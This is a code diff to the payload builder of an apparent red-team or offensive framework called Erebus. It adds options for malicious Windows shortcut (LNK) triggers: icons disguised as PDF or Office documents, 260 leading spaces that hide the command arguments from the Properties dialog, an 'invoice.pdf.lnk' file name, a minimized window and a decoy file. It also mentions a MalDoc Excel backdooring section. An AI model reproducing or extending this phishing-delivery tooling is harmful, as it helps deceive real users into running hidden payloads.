@@ -1159,6 +1159,33 @@ appdomain (self)""",
             ]
         ),
 
+        BuildParameter(
+            name="0.9n LNK Icon",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Icon disguise for the LNK shortcut. Resolves via environment-variable paths on the target host.",
+            choices=["pdf", "word", "excel", "powerpoint", "outlook", "onenote", "folder", "document", "notepad", "edge", "generic"],
+            default_value="pdf",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="LNK"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9o LNK Argument Pad",
+            parameter_type=BuildParameterType.String,
+            description="Number of leading space characters prepended to arguments to push them off-screen in the shortcut Properties dialog (argument hiding). Recommended: 260.",
+            default_value="260",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="LNK"),
+            ]
+        ),
+
   # MalDocs - Excel Backdooring
         BuildParameter(
             name="0.9 Create MalDoc",
@@ -4756,37 +4783,54 @@ generated if none have been entered.""",
                         case "LNK":
                             trigger_bin  = str(self.get_parameter("0.9a Trigger Binary"))
                             trigger_args = str(self.get_parameter("0.9b Trigger Command"))
+                            _lnk_icon    = str(self.get_parameter("0.9n LNK Icon") or "pdf")
+                            try:
+                                _lnk_pad = int(str(self.get_parameter("0.9o LNK Argument Pad") or "260"))
+                            except (ValueError, TypeError):
+                                _lnk_pad = 260
 
                             # Load the helper's trigger_lnk module via path so
                             # the dot-in-directory name doesn't break imports.
-                            # This keeps icon-resolution logic in one place
-                            # (erebus_helper.py) rather than duplicated here.
-                            _helper_root = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
+                            _helper_root  = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                             _lnk_mod_path = _helper_root / "modules" / "trigger_lnk.py"
                             import importlib.util as _ilu
                             _lnk_spec = _ilu.spec_from_file_location("_helper_trigger_lnk", str(_lnk_mod_path))
                             _lnk_mod  = _ilu.module_from_spec(_lnk_spec)
                             _lnk_spec.loader.exec_module(_lnk_mod)
 
+                            _icon_src, _icon_idx = _lnk_mod.get_icon_by_alias(_lnk_icon)
+
+                            # Use '!' as a placeholder for '%' in arguments so
+                            # env-var tokens in trigger_args are not expanded by
+                            # the shell during LNK creation; the module swaps
+                            # them back after writing the file.
+                            _lnk_args_safe = trigger_args.replace("%", "!")
+
                             trigger_path = _lnk_mod.create_payload_trigger(
-                                target_bin=trigger_bin,
-                                args=trigger_args,
-                                icon_src=r"%SystemRoot%\system32\shell32.dll",
-                                icon_index=0,
-                                description="Invoice",
-                                payload_dir=payload_dir,
-                                decoy_file=decoy_file,
+                                target_bin      = trigger_bin,
+                                args            = _lnk_args_safe,
+                                icon_src        = _icon_src,
+                                icon_index      = _icon_idx,
+                                description     = "Invoice",
+                                payload_dir     = payload_dir,
+                                decoy_file      = decoy_file,
+                                output_filename = "invoice.pdf.lnk",
+                                window_mode     = "minimized",
+                                pad             = _lnk_pad,
+                                search          = "!",
+                                replace         = "%",
+                                mimic_as_file   = "Document",
                             )
 
-                            # Write a Windows batch file so the operator can
-                            # re-build the LNK with native icon resolution on
-                            # a Windows host using the bundled erebus_helper.py.
+                            # Write a rebuild helper so the operator can
+                            # re-create the LNK on a Windows host if COM /
+                            # pywin32 was unavailable at build time.
                             lnk_name = trigger_path.name if hasattr(trigger_path, "name") else str(trigger_path).split(os.sep)[-1]
                             bat_lines = [
                                 "@echo off",
-                                "REM Re-create LNK with correct Windows icons using the bundled helper.",
-                                "REM Run this on a Windows host after extracting the payload archive.",
-                                f'python erebus_helper.py lnk --target-binary "{trigger_bin}" --arguments "{trigger_args}" --output "{lnk_name}" --description "Invoice"',
+                                "REM Re-create LNK with native COM icon resolution on a Windows host.",
+                                "REM Run this after extracting the payload archive if the LNK icon is incorrect.",
+                                f'python erebus_helper.py lnk --target-binary "{trigger_bin}" --arguments "{trigger_args}" --icon "{_lnk_icon}" --pad {_lnk_pad} --output "{lnk_name}"',
                                 "echo LNK created: %errorlevel%",
                             ]
                             bat_path = payload_dir / "build_lnk.bat"
